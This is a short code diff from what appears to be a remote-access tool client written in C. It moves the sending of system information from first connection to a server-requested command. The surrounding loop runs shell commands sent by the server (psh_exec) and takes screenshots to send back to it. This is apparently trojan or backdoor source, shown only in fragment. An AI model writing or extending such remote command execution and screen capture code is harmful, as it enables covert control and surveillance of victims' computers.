@@ -35,11 +35,6 @@ connect:
         sleep(3);
     }
 
-    // Send client info upon first time connecting
-    char* client_info = print_client_info();
-    safe_send(sock, client_info, SYS_INFO_CMD, strlen(client_info) + 1, 0);
-    free(client_info);
-
     // Main loop
     while (1) {
         int cmd = 0;
@@ -57,6 +52,10 @@ connect:
 
         if (cmd == PSH_CMD) {
             psh_exec(sock, payload);
+        } else if (cmd == SYS_INFO_CMD) {
+            char *client_info = print_client_info();
+            safe_send(sock, client_info, SYS_INFO_CMD, strlen(client_info) + 1, 0);
+            free(client_info);
         } else if (cmd == SCREEN_CMD) {
             // Take screenshot and send raw file to server
             size_t size = 0;
